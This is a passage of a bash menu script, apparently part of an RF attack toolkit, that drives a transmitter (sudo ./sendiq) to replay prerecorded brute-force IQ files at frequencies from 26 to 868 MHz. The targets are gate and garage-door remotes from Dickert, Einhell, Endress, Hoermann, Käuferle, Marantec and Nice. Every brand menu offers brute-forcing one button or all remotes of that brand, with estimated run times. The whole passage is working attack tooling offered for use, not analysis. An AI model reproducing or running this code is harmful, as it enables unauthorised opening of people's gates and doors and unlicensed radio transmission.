     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 4 Dickert 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute Force Main Button (Recommend)"
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 other button"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 8min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/1-dickert-40FM.iq & 
     bash timeur.sh 8
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     dickert
     elif [[ $nuu = 00 ]];then
     dickert
     elif [[ $nuu = 2 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 24min $jaune2 3 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/dickert-40FM.iq &
     bash timeur.sh 24
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     dickert
     fi

     elif [[ $n = 2 ]];then
      echo -e " $white Dickert 40 FM     $vert 40MHz " | toilet -f term -F border
      echo -e " $white Dickert 433 Quick $vert 433.92MHz " | toilet -f term -F border
      echo -e " $white Dickert 433L      $vert 433.92MHz " | toilet -f term -F border
      echo -e " $white Dickert 868 FM    $vert 868MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for brute the 4 remotes: $white 32min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 32 &
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/dickert-40FM.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-dickert-quick-433.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-dickert-433L.iq
     sudo ./sendiq -s 250000 -f "868.3"e6 -t u8 -i .derrow/1-dickert-868.iq
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     dickert

     elif [[ $nu = 00 ]];then
     dickert

     else
     dickert
     fi
     elif [[ $n = 00 ]];then
      brute

     else
     dickert
     fi

     }
     dickert

    ;;
 11)function dickert3(){
     clear
     echo -e $white "$white $rouge3 Dickert " | toilet -f mono9 -F border | lolcat
     echo -e $violet "Dickert 433 Quick" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Nederlands     $bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 8min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 4 Dickert 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute Force Main Button (Recommend)"
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 other button"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 9min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-dickert-quick-433.iq &
     bash timeur.sh 9
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     dickert3
     elif [[ $nuu = 00 ]];then
     dickert3
     elif [[ $nuu = 2 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 25min $jaune2 3 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/dickert-quick-433.iq &
     bash timeur.sh 25
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     dickert3
     fi

     elif [[ $n = 2 ]];then
      echo -e " $white Dickert 40 FM     $vert 40MHz " | toilet -f term -F border
      echo -e " $white Dickert 433 Quick $vert 433.92MHz " | toilet -f term -F border
      echo -e " $white Dickert 433L      $vert 433.92MHz " | toilet -f term -F border
      echo -e " $white Dickert 868 FM    $vert 868MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for brute the 4 remotes: $white 32min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 32 &
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/dickert-40FM.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-dickert-quick-433.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-dickert-433L.iq
     sudo ./sendiq -s 250000 -f "868.3"e6 -t u8 -i .derrow/1-dickert-868.iq
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     dickert3

     elif [[ $nu = 00 ]];then
     dickert3

     else
     dickert3
     fi
     elif [[ $n = 00 ]];then
      brute

     else
     dickert3
     fi

     }
     dickert3

    ;;
  12)function dickert4(){
     clear
     echo -e $white "$white $rouge3 Dickert " | toilet -f mono9 -F border | lolcat
     echo -e $violet "Dickert 433L" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Nederlands     $bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 8min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force les the Dickert 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force Boutton principal (Recommander) "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 autre boutton"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 8min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-dickert-433L.iq &
     bash timeur.sh 8
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     dickert4
     elif [[ $nuu = 00 ]];then
     dickert4
     elif [[ $nuu = 2 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 25min $jaune2 3 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/dickert-433L.iq &
     bash timeur.sh 25
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     dickert4
     fi

     elif [[ $n = 2 ]];then
      echo -e " $white Dickert 40 FM     $vert 40MHz " | toilet -f term -F border
      echo -e " $white Dickert 433 Quick $vert 433.92MHz " | toilet -f term -F border
      echo -e " $white Dickert 433L      $vert 433.92MHz " | toilet -f term -F border
      echo -e " $white Dickert 868 FM    $vert 868MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for brute the 4 remotes: $white 32min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 32 &
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/dickert-40FM.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-dickert-quick-433.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-dickert-433L.iq
     sudo ./sendiq -s 250000 -f "868.3"e6 -t u8 -i .derrow/1-dickert-868.iq
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     dickert4

     elif [[ $nu = 00 ]];then
     dickert4

     else
     dickert4
     fi
     elif [[ $n = 00 ]];then
      brute

     else
     dickert4
     fi

     }
     dickert4

    ;;

13)function dickert5(){
     clear
     echo -e $white "$white $rouge3 Dickert " | toilet -f mono9 -F border | lolcat
     echo -e $violet "Dickert 868 FM" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Nederlands     $bleu 📶 frequency: $vert 868.3MHz   $cyan ⏳ Time: $white 8min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 4 Dickert 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 868.3MHz   $cyan ⏳ Time: $white 8min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "868.3"e6 -t u8 -i .derrow/1-dickert-868.iq &
     bash timeur.sh 8
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     dickert5
     elif [[ $n = 2 ]];then
      echo -e " $white Dickert 40 FM     $vert 40MHz " | toilet -f term -F border
      echo -e " $white Dickert 433 Quick $vert 433.92MHz " | toilet -f term -F border
      echo -e " $white Dickert 433L      $vert 433.92MHz " | toilet -f term -F border
      echo -e " $white Dickert 868 FM    $vert 868MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for brute the 4 remotes: $white //min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 32 &
     sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/dickert-40FM.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-dickert-quick-433.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-dickert-433L.iq
     sudo ./sendiq -s 250000 -f "868.3"e6 -t u8 -i .derrow/1-dickert-868.iq
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     dickert5

     elif [[ $nu = 00 ]];then
     dickert5

     else
     dickert5
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     dickert5
     fi


     }
     dickert5


    ;;
  14)function einhell2(){
     clear
     echo -e $white "$white $rouge3 Einhell " | toilet -f mono9 -F border | lolcat
     echo -e " $blanc[$white 22 $blanc] $white Einhell 27 Quick" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 26.995MHz   $cyan ⏳ Time: $white 8min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 26.995MHz   $cyan ⏳ Time: $white 8min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "26.995"e6 -t u8 -i .derrow/1-einhell-quick-27.iq &
     bash timeur.sh 8
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back to the menu : Press ENTER" ;printf $white ;read n
     einhell2

     elif [[ $n = 00 ]];then
      brute
     else
     einhell2
     fi


     }
     einhell2
     ;;

15)function endress(){                                                                                                                                              clear                                                                                                                                                          echo -e $white "$white $rouge3 Endress " | toilet -f mono9 -F border | lolcat
     clear
     echo -e $jaune2 "$rouge2 Endress 27" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Swiss     $bleu 📶 frequency: $vert 27.095MHz   $cyan ⏳ Time: $white 8min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 27.095MHz   $cyan ⏳ Time: $white 8min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "27.095"e6 -t u8 -i .derrow/1-endress-27.iq &
     bash timeur.sh 8
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     endress

     elif [[ $n = 00 ]];then
      brute
     else
     endress                                                                                                                                                        fi
     fi
     }
     endress
     ;;

  16)function hoermann(){
     clear
     echo -e $white "$white $rouge3 Hoermann " | toilet -f mono9 -F border | lolcat
     echo -e $jaune2 "$rouge2 Hoermann 27 " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 26.975MHz   $cyan ⏳ Time: $white //min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute Force Main Button (Recommend) "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 other boutton"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 26.975MHz   $cyan ⏳ Time: $white 8min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "26.975"e6 -t u8 -i .derrow/1-hörmann-27.iq &
     bash timeur.sh 8
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     hoermann
     elif [[ $nuu = 00 ]];then
     hoermann
     elif [[ $nuu = 2 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 26.975MHz   $cyan ⏳ Time: $white 26min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "26.975"e6 -t u8 -i .derrow/hörmann-27.iq &
     bash timeur.sh 25
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     hoermann
     fi
     elif [[ $n = 00 ]];then                                                                                                                                         brute

     else
     hoermann
     fi
     }
     hoermann

    ;;

  17)function Käuferle(){
     clear
     echo -e $white "$white $rouge3 Käuferle " | toilet -f mono9 -F border | lolcat
     echo -e $bleu2 "$white $noir Käuferle 27" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 27.015MHz   $cyan ⏳ Time: $white 9min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 3 Käuferle 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 27.015MHz   $cyan ⏳ Time: $white 9min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "27.015"e6 -t u8 -i .derrow/1-kauferle-27.iq &
     bash timeur.sh 9
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     Käuferle


     elif [[ $n = 2 ]];then
      echo -e " $white Käuferle 27        $vert 27MHz " | toilet -f term -F border
      echo -e " $white Käuferle 40        $vert 40MHz " | toilet -f term -F border
      echo -e " $white Käuferle 433       $vert 433.92MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for the 3 remotes: $white //min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 22 &
     sudo ./sendiq -s 250000 -f "27.015"e6 -t u8 -i .derrow/1-kauferle-27.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-kauferle-433.iq
     #sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/1-kauferle-433.iq &
     echo
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     Käuferle

     elif [[ $nu = 00 ]];then
     Käuferle
     else
     Käuferle
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     Käuferle
     fi


     }
     Käuferle

    ;;
  18)function Käuferle2(){
     clear
     echo -e $white "$white $rouge3 Käuferle " | toilet -f mono9 -F border | lolcat
     echo -e $bleu2 "$white $noir Käuferle 40" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white //min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 3 Käuferle 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 40.685MHz   $cyan ⏳ Time: $white 6min $jaune2 1 Boutton" | toilet -f term -F border
     #sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/1-kauferle-433.iq &
     bash timeur.sh 6
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     Käuferle2

     elif [[ $n = 2 ]];then
      echo -e " $white Käuferle 27        $vert 27MHz " | toilet -f term -F border
      echo -e " $white Käuferle 40        $vert 40MHz " | toilet -f term -F border
      echo -e " $white Käuferle 433       $vert 433.92MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for the 3 remotes: $white //min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 22 &
     sudo ./sendiq -s 250000 -f "27.015"e6 -t u8 -i .derrow/1-kauferle-27.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-kauferle-433.iq
     #sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/1-kauferle-433.iq &
     echo
     echo -e "                             $vert Signal finished✅"                                                                                                 echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     Käuferle

     elif [[ $nu = 00 ]];then
     Käuferle2

     else
     Käuferle2
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     Käuferle2
     fi


     }
     Käuferle2

    ;;
  19)function Käuferle3(){
     clear
     echo -e $white "$white $rouge3 Käuferle " | toilet -f mono9 -F border | lolcat
     echo -e $bleu2 "$white $noir Käuferle 433" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 6min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 3 Käuferle 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute Force Main Button (Recommend) "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force 3 other boutton"
     echo
     printf  "📊 $vert Choose an option : " ;printf $white ;read nuu
     if [[ $nuu = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 6min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-kauferle-433.iq &
     bash timeur.sh 6
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     Käuferle3
     elif [[ $nuu = 00 ]];then
     Käuferle3
     elif [[ $nuu = 2 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 433.92MHz   $cyan ⏳ Time: $white 20min $jaune2 3 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/kauferle-433.iq &
     bash timeur.sh 20
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     Käuferle3
     fi

     elif [[ $n = 2 ]];then
      echo -e " $white Käuferle 27        $vert 27MHz " | toilet -f term -F border
      echo -e " $white Käuferle 40        $vert 40MHz " | toilet -f term -F border
      echo -e " $white Käuferle 433       $vert 433.92MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time for the 3 remotes: $white //min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 22 &
     sudo ./sendiq -s 250000 -f "27.015"e6 -t u8 -i .derrow/1-kauferle-27.iq
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-kauferle-433.iq
     #sudo ./sendiq -s 250000 -f "40.685"e6 -t u8 -i .derrow/1-kauferle-433.iq &
     echo
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     Käuferle

     elif [[ $nu = 00 ]];then
     Käuferle3

     else
     Käuferle3
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     Käuferle3
     fi


     }
     Käuferle3
    ;;
  20)function marantec(){
     clear
     echo -e $white "$white $rouge3 Marantec " | toilet -f mono9 -F border | lolcat
     echo -e $white "$noir2  Marantec 27" | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge Germany     $bleu 📶 frequency: $vert 27.045MHz   $cyan ⏳ Time: $white 9min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 27.045MHz   $cyan ⏳ Time: $white 9min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "27.045"e6 -t u8 -i .derrow/1-marantec-27.iq &
     bash timeur.sh 9
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     marantec

     elif [[ $n = 00 ]];then
      brute
     else
     marantec
     fi
     }
     marantec

    ;;

  21)function nice(){
     clear
     echo -e $white "$white $rouge3 Nice " | toilet -f mono9 -F border | lolcat
     echo -e $bleu2 "$bleu $bleu2 $noir2  Nice 26 " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge France     $bleu 📶 frequency: $vert 26MHz   $cyan ⏳ Time: $white 9min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 5 Nice 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 26.875MHz   $cyan ⏳ Time: $white 9min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "26.875"e6 -t u8 -i .derrow/1-nice-26.iq &
     bash timeur.sh 9
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     nice


     elif [[ $n = 2 ]];then
      echo -e " $white Nice 26            $vert 26MHz " | toilet -f term -F border
      echo -e " $white Nice 27            $vert 27MHz " | toilet -f term -F border
      echo -e " $white Nice 30            $vert 30MHz " | toilet -f term -F border
      echo -e " $white Nice 30.9          $vert 30.9MHz " | toilet -f term -F border
      echo -e " $white Nice flo 433       $vert 433.92MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time pour the 5 télecommandes: $white 40min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 39 &
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-nice-flo-433.iq
     sudo ./sendiq -s 250000 -f "26.875"e6 -t u8 -i .derrow/1-nice-26.iq
     sudo ./sendiq -s 250000 -f "27.120"e6 -t u8 -i .derrow/1-nice-27.iq
     sudo ./sendiq -s 250000 -f "30.875"e6 -t u8 -i .derrow/1-nice-30.iq
     sudo ./sendiq -s 250000 -f "30.900"e6 -t u8 -i .derrow/1-nice-30-9.iq
     echo
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     nice

     elif [[ $nu = 00 ]];then
     nice

     else
     nice
     fi
     elif [[ $n = 00 ]];then
      brute
     else
     nice
     fi


     }
     nice

    ;;
  22)function nice2(){
     clear
     echo -e $white "$white $rouge3 Nice " | toilet -f mono9 -F border | lolcat
     echo -e $bleu2 "$bleu $bleu2 $noir2  Nice 27 " | toilet -f term -F border
     echo -e $bleu "🚩 Origin : $rouge France     $bleu 📶 frequency: $vert 27.120MHz   $cyan ⏳ Time: $white 9min"
     echo
     echo -e " $white[$blanc 1️⃣  $white] $rouge Brute force 🔑🚪 "
     echo -e " $white[$blanc 2️⃣  $white] $rouge Brute force the 5 Nice 📲 🔑  "
     echo
     echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Choose an option : " ;printf $white ;read n
     if [[ $n = 1 ]];then
     echo -e $jaune
     horlogebis
     echo -e "$bleu 📶 frequency: $vert 27.120MHz   $cyan ⏳ Time: $white 9min $jaune2 1 Boutton" | toilet -f term -F border
     sudo ./sendiq -s 250000 -f "27.120"e6 -t u8 -i .derrow/1-nice-27.iq &
     bash timeur.sh 9
     echo -e "                             $vert Signal finished✅"
     echo
     printf  "📊 $vert Back au menu : Tappe ENTER" ;printf $white ;read n
     nice2


     elif [[ $n = 2 ]];then
      echo -e " $white Nice 26            $vert 26MHz " | toilet -f term -F border
      echo -e " $white Nice 27            $vert 27MHz " | toilet -f term -F border
      echo -e " $white Nice 30            $vert 30MHz " | toilet -f term -F border
      echo -e " $white Nice 30.9          $vert 30.9MHz " | toilet -f term -F border
      echo -e " $white Nice flo 433       $vert 433.92MHz " | toilet -f term -F border
      echo
      echo -e "$cyan ⏳ Time pour the 5 télecommandes: $white 40min"
      echo
      echo -e "                                            $bleu[$white 00 $bleu] $rouge 🔙" "$white Back"
     printf  "📊 $vert Press ENTER for start the brute : " ;printf $white ;read nu
     if [[ $nu = ""  ]];then
     echo -e $jaune
     horlogebis
     echo -e $white
     bash timeur.sh 39 &
     sudo ./sendiq -s 250000 -f "433.92"e6 -t u8 -i .derrow/1-nice-flo-433.iq
     sudo ./sendiq -s 250000 -f "26.875"e6 -t u8 -i .derrow/1-nice-26.iq
     sudo ./sendiq -s 250000 -f "27.120"e6 -t u8 -i .derrow/1-nice-27.iq
     sudo ./sendiq -s 250000 -f "30.875"e6 -t u8 -i .derrow/1-nice-30.iq
